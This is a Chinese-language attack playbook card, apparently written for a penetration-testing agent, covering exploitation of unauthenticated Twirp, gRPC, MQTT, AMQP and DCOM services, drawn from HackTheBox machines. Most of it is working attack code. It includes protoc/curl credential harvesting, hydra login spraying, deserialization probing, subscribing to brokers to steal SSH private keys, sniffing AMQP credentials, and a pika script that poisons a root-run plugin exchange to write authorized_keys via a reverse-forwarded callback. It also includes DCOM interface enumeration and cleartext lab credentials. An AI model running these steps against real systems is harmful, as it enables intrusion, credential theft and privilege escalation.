---
name: 'internal-rpc-broker-attacks'
description: '非 HTTP 私有 RPC 与消息中间件裸端口上的打法:响应冒出 twirp_invalid_route / grpc-message / application/grpc 或二进制 body、目录里有 .proto、1883/5672/4369/15672 开着、135 上 rpcmap.py 能列接口 → protoc 或 grpc_tools 生成客户端直接调、mosquitto_sub 订 $SYS、tshark 抓 AMQP 明文凭据、IObjectExporter 匿名读网卡。（检索词：twirp/grpc/gRPC/protobuf/protoc/grpcurl/mqtt/MQTT/mosquitto/amqp/AMQP/rabbitmq/RabbitMQ/4369/5672/1883/DCOM/rpcmap/IObjectExporter/消息队列/私有RPC/中间件/Erlang Port Mapper/Erlang-Port-Mapper/rabbit mq/internal/broker/attacks）'
whenToUse: '端口开着但 nmap -sV 给不出服务名、HTTP 端口回协议级报错而不是网页、或 135/1883/5672/4369 暴露时加载;拿到 .proto 后照本卡生成客户端'
metadata: { domain: network, tier: T2 }
---

# 私有 RPC 与消息中间件:无鉴权接口的攻击面

> 来自 Insane 官方 WP 逐台回核,**4 台命中**:PlayerTwo / Laser / Dyplesher / APT。

这类协议**默认不鉴权**,难点是**先把消息结构还原出来**:拿到 `.proto`/服务名/exchange
名 = 拿到 API 文档,剩下的是照抄 stub 调用。

## 触发信号

| 我看到了什么 | 指向 |
|---|---|
| `nmap -sC` 在高位端口回 `twirp_invalid_route` | Twirp(RPC over HTTP) |
| 响应带 `grpc-message` 头或 `application/grpc`,body 含不可打印字节 | gRPC/protobuf |
| 目录爆破出 `/proto`、`/generated`,里面有 `.proto`;9000/50051 开着但 `-sV` 给不出服务名 | gRPC |
| 1883 开着且进程里有 `mosquitto`;或 4369 + 5672 同开(Erlang Port Mapper + RabbitMQ) | MQTT / AMQP |
| 135 开着、SMB 匿名可连 | 匿名 DCOM/RPC |

> ⚠️ 本表里 `grpc-message` / `application/grpc` / `50051` / `15672` 是这类协议的**通用指纹**,4 台 WP 里没有逐字出现(逐字命中的是 `twirp_invalid_route`、`unpickling stack underflow`、1883/5672/4369)。按通用指纹排查没错,但别把它当 WP 证据。

## 前置验证

```bash
nmap -p$ports -sC -sV <IP>            # 高位端口别猜,让脚本扫描自己报协议名
# 报错串就是指纹:twirp_invalid_route→Twirp;unpickling stack underflow→服务端在反序列化
rpcmap.py 'ncacn_ip_tcp:10.10.10.213' -brute-opnums -auth-level 1 -opnum-max 5
```

## 模式 1:Twirp over HTTP —— 用 protoc 当场造客户端

条件:HTTP 端口回 `twirp_invalid_route` 且目录里有 `.proto`。Twirp 路由写死为
`/twirp/<package>.<Service>/<Method>`,拿到 proto 就能直接 curl。

```bash
wget https://github.com/protocolbuffers/protobuf/releases/download/v3.12.3/protoc-3.12.3-linux-x86_64.zip
unzip protoc-3.12.3-linux-x86_64.zip
# 请求 + 用同一个 proto 解码响应(响应是二进制,不 decode 看不懂)
curl -s -X POST -H "Content-Type: application/protobuf" \
  http://player2.htb:8545/twirp/twirp.player2.auth.Auth/GenCreds \
  | ./bin/protoc -I . --decode twirp.player2.auth.Creds generated.proto
# 方法随机返回 → 上面这条循环 100 次(行尾 >> userpass.txt)再 gawk 去重
hydra -C userpass.txt product.player2.htb http-post-form "/index:username=^USER^&password=^PASS^&Submit=Sign in:Nope"
```

| 机器 | 细节 |
|------|------|
| PlayerTwo | 8545 脚本扫描回 `twirp_invalid_route`;`generated.proto` 定义包 `twirp.player2.auth`、服务 `Auth`、方法 `GenCreds()`(入参 `count` 出参 `Creds`);100 次请求收集到 `0xdf / XHq7_WJTA?QD_?E2` |

## 模式 2:gRPC —— 手写 .proto,grpc_tools 生成 stub

条件:端口像 9000 且 `-sV` 无语义。**先找服务名与字段名**(文档/PDF/前端 JS);只有知道
`service`/`rpc`/字段号才能写 proto,猜的会静默失败。

```bash
# print.proto(服务名/方法名来自产品文档):
#   syntax = "proto3";  service Print { rpc Feed (Content) returns (Data) {} }
#   message Content { string data = 1; }   message Data { string feed = 1; }
pip3 install grpcio-tools
python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. print.proto
```

```python
import grpc, print_pb2, print_pb2_grpc
channel = grpc.insecure_channel("10.10.10.201:9000")
stub = print_pb2_grpc.PrintStub(channel)
data = stub.Feed(print_pb2.Content(data = "abcde"))      # 报错说明要 base64
data = stub.Feed(print_pb2.Content(data = "YWJjZGU="))   # 再报 unpickling stack underflow
```

🔴 报错串是**免费的字段类型提示**:要 base64→输入得编码;`unpickling stack underflow`
→ 服务端 `pickle.loads`,再往下就是 SSRF/反序列化面。

| 机器 | 细节 |
|------|------|
| Laser | 9100 是打印机(PJL),`nvram` 泄出 AES 密钥 `13vu94r6643rv19u` 解开排队作业 → PDF 说明 Feed Engine 跑在 9000 上、用 gRPC+protobuf;写 `print.proto` 生成 stub 调 `Feed`,pickle 化 feed 后服务端以 `FeedBot` UA 回连 → SSRF |

## 模式 3:消息中间件裸端口 —— 订阅,凭据常在消息体里

条件:1883/5672/4369/15672 暴露。broker 默认匿名可订,而**生产者常把密钥、token、私钥直接当消息发出去**。

```bash
ssh -R 1883:127.0.0.1:1883 temp@10.10.14.5 -N   # 只监听 127.0.0.1 时先反向转发出来
mosquitto_sub -t '$SYS/#' -h 127.0.0.1 -p 1883   # # 是通配符;$SYS 存 broker 自身信息
```

🔴 `$SYS` 只是**起点**:先把 `#` 全订一遍再收窄。WP 里 SSH 私钥就是被发布到某个 topic 上,
抓到后存成 `id_rsa` 直接 `ssh -i`。

| 机器 | 细节 |
|------|------|
| PlayerTwo | foothold 后 `netstat` 见 1883 + `mosquitto` 进程;`mosquitto_sub -t '$SYS/#'` 读到服务端发布的 SSH 私钥 → 登录用户 `observer` 拿 user flag |

## 模式 4:AMQP —— 抓流量拿凭据,再往 exchange 投毒

条件:已立足,且 `pspy` 显示 root 周期跑 AMQP 消费者(如 cuberite 的 Lua 插件加载)。

```bash
tshark -i any -w /tmp/capture.pcap "port 5672"    # 目标在 wireshark 组/有 dumpcap
scp MinatoTW@10.10.10.190:/tmp/capture.pcap .     # Follow TCP Stream → 邮箱与密码明文
```

```python
import pika
credentials = pika.PlainCredentials('yuntao','EashAnicOc3Op')
parameters = pika.ConnectionParameters('10.10.10.190',5672,'/',credentials)
connection = pika.BlockingConnection(parameters)
channel = connection.channel()
channel.basic_publish(exchange='plugin_data', routing_key='',
                      body='http://127.0.0.1:8000/test.lua')
connection.close()
```

🔴 **出站被墙别放弃**:payload 放进目标可写 web 目录,或
`ssh -R 8000:127.0.0.1:8000 MinatoTW@10.10.10.190` 让 broker 回连你自己。
消费者以 root 跑 → 投毒 Lua 插件直接写 `/root/.ssh/authorized_keys`。

| 机器 | 细节 |
|------|------|
| Dyplesher | 4369/5672/11211/25565 开放;`amqp-com` 每分钟由 root 拉起,cuberite 是 AMQP 消费者;`tshark` 抓 5672 得 felamos 与 yuntao 凭据;`plugin_data` exchange 投递 `test.lua` → root 写 `/dev/shm/test.txt`,改写后写 `/root/.ssh/authorized_keys` |

## 模式 5:匿名 DCOM/RPC 接口枚举

条件:135 或高位 RPC 端口开放。DCOM 接口**很多方法不要求认证**,列出接口后逐个试 opnum。

```bash
rpcmap.py 'ncacn_ip_tcp:10.10.10.213' | grep -A2 'DCOM'   # 只筛 DCOM 映射,输出 UUID
rpcmap.py 'ncacn_ip_tcp:10.10.10.213' -brute-opnums -auth-level 1 -opnum-max 5
```

```python
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE
from impacket.dcerpc.v5.dcomrt import IObjectExporter
t = transport.DCERPCTransportFactory('ncacn_ip_tcp:10.10.10.213')
pm = t.get_dce_rpc()
pm.set_auth_level(RPC_C_AUTHN_LEVEL_NONE)
pm.connect()
for b in IObjectExporter(pm).ServerAlive2():
    print(b['aNetworkAddr'])
```

🔴 拿到的是**网卡地址**,不是主机名。WP 里 `ServerAlive2`(Opnum 5)吐出 IPv6
`dead:beef::b885:d62a:d679:573f` —— IPv4 扫不到的端口在 IPv6 上全开。
| 机器 | 细节 |
|------|------|
| APT | 全端口只有 80/135;`rpcmap.py` 列出 IID_IRemoteSCMActivator / IID_IActivation / IID_IObjectExporter;opnum 3 与 5(`ServerAlive`/`ServerAlive2`)免认证;取到 IPv6 后 `nmap -T4 --min-rate=1000 -sC -sV -6 apt` 才发现是 DC |

## 快速检查清单

```bash
[ ] 高位端口的 -sC 报错串抄下来搜过没有(twirp_invalid_route / grpc-message)
[ ] /proto /generated 扫过没有;.proto 拿到后 protoc --decode 用过没有
[ ] 1883 订过 # 而不只是 $SYS;4369+5672 同开时 tshark 抓过 5672 没有
[ ] 135 上跑过 rpcmap.py -brute-opnums -auth-level 1 没有;ServerAlive2 给的 IPv6 单独扫过没有
```

## 教训

1. **协议报错串是最高价值的指纹**。`twirp_invalid_route` 点名框架;`unpickling stack underflow` 暴露服务端反序列化。nmap `-sC` 输出要逐字读。
2. **`.proto` 是 API 文档,不是配置文件**。拿到它就别再 fuzz 路径,`/twirp/<pkg>.<Svc>/<Method>` 已经写死。
3. **消息中间件的价值在"别人发的消息"里**:生产者会把私钥、口令当消息广播,抓包优先于爆破;`ServerAlive2` 给的 IPv6 常绕过全部防火墙规则。

## 相关卡

- `unknown-service-probe` —— 端口连服务名都报不出来时,先走 Banner→指纹→CVE 三步法
- `service-attacks` —— 41 端口速查表;本卡补的是它没覆盖的"怎么真的跟协议对话"
- `kafka-pentesting` —— 同类消息中间件(Kafka),消费/注入消息的手法可直接平移
- `tunneling-port-forwarding` —— `ssh -R` 把只监听 127.0.0.1 的 1883/5672 转发出来
